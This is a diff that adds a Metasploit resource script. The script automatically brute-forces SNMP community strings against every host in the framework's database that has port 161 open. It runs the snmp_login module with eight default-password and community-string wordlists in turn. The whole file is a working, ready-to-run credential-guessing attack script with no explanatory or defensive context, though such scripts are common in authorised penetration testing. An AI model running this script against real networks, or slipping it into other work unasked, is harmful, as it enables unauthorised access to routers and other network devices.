@@ -1,0 +1,27 @@
+use auxiliary/scanner/snmp/snmp_login
+set THREADS 5
+
+<ruby>
+list=[
+"/usr/share/seclists/Passwords/top_shortlist.txt",
+"/usr/share/seclists/Passwords/500-worst-passwords.txt",
+"/opt/metasploit/apps/pro/data/wordlists/snmp_default_pass.txt",
+"/usr/share/seclists/Misc/wordlist-common-snmp-community-strings.txt",
+"/usr/share/nmap/nselib/data/snmpcommunities.lst",
+"/opt/metasploit/apps/pro/data/wordlists/telnet_cisco_default_user.txt",
+"/opt/metasploit/apps/pro/data/wordlists/telnet_cisco_default_pass.txt",
+"/usr/share/wordlists/nmap.lst"
+]
+framework.db.hosts.each do |host|
+  host.services.each do |service|
+    if service.port == 161
+      self.run_single("set RHOSTS #{host.address}")
+      self.run_single("set RPORT #{service.port}")
+      list.each do |wordlist|
+        self.run_single("set PASS_FILE #{wordlist}")
+        self.run_single("run")
+      end
+    end
+  end
+end
+</ruby>
